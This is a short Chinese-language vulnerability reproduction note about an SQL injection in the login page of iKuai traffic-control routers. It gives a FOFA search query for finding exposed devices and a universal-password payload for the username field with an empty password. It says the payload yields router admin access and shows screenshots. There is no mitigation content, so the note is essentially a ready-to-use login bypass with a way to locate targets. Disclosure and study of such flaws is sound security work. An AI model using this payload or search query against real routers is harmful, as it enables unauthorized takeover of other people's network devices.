# iKuai 流控路由 SQL注入漏洞

## 漏洞描述

iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限

## 漏洞影响

> [!NOTE]
>
> iKuai 流控路由

## FOFA

> [!NOTE]
>
> title="登录爱快流控路由"

## 漏洞复现

登录页面如下

![image-20210531180103698](http://wikioss.peiqi.tech/vuln/image-20210531180103698.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

使用万能密码登录后台

```
user: "or""=""or""="
pass: 空
```

![image-20210531180212296](http://wikioss.peiqi.tech/vuln/image-20210531180212296.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)